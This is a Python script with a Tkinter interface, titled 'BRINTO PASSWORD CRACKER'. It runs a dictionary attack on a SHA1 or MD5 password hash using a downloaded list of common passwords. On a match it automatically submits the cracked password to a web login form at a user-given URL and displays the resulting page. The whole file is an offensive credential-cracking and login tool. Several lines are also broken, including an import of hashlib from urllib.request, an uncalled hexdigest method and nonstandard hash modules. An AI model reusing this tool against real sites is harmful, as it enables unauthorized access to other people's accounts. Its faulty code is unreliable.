from urllib.request import urlopen, hashlib
from tkinter import *
import mechanize
import sha1
import nmd5

def nopass(url,string,value):
	#setpass = bytes(string, 'utf-8')
	#hash_object = sha1.sha1(setpass)
	nff=0
	sha1hash = string
	LIST_OF_COMMON_PASSWORDS = str(urlopen(
		'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
								   'utf-8')
	for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
		#msg = bytearray("123456", 'UTF-8')

		# custom_sha1_digest = sha1.sha1(bytes(msg))

		hashedGuess = sha1.sha1(bytes(guess, 'utf-8'))
		ns2 = nmd5.new(guess)
		require="789"
		if guess=="street":
			print(ns2.hexdigest)
			print(sha1hash)
		if value==1:
			require=hashedGuess
		if value==2:
			require=ns2.hexdigest()
		if require == sha1hash:
			br = mechanize.Browser()
			br.set_handle_robots(False)
			br.open(url)
			br.select_form(name="x")
			br["id"] = "12"
			br["password"] = str(guess)
			res = br.submit()
			content = res.read()
			with open("mechanize_results.html", "wb") as f:
				f.write(content)
				T.insert(END,content)
			T1.insert(END,str(guess))
			nff=1

		elif require != sha1hash:
			#T.insert(END, "Password guess "+str(guess)+" does not match, trying next...\n")
			if(nff==0):
				print("Password guess ", str(guess), " does not match, trying next...")
	if nff==0:
		T1.insert(END,"NOT FOUND")
		print("Password not in database, we'll get them next time.")

def doNothing():
	print("ok ok i wont ...")

def printtext():
	global e
	global e1
	global v
	string = e.get()
	url=e1.get()
	print(string)
	print(v.get())
	nopass(url,string,v.get())
def ShowChoice():
	print(v.get())
#url = "http://localhost/login_exploit.php"

root=Tk()
v = IntVar()

root.title('BRINTO PASSWORD CRACKER')
Label(root,text="Enter URL of the Webpage:").pack()
e1 = Entry(root)
e1.pack()
e1.focus_set()
Label(root,text="Enter The hash value:").pack()
e = Entry(root)
e.pack()
e.focus_set()
Label(root,text="Enter Encryption Type:").pack()
Radiobutton(root,text="SHA1",padx = 20,variable=v,command=ShowChoice,value=1).pack(anchor=W)
Radiobutton(root,text="MD5",padx = 20,variable=v,command=ShowChoice,value=2).pack(anchor=W)
b = Button(root,text='find',command=printtext)
b.pack()
Label(root,text="Password is:").pack()
T1 = Text(root,height=0.2, width=20)
T1.pack()
S = Scrollbar(root)
T = Text(root, height=20, width=40)
S.pack(side=RIGHT, fill=Y)
T.pack(side=LEFT, fill=Y)
S.config(command=T.yview)
T.config(yscrollcommand=S.set)


root.mainloop()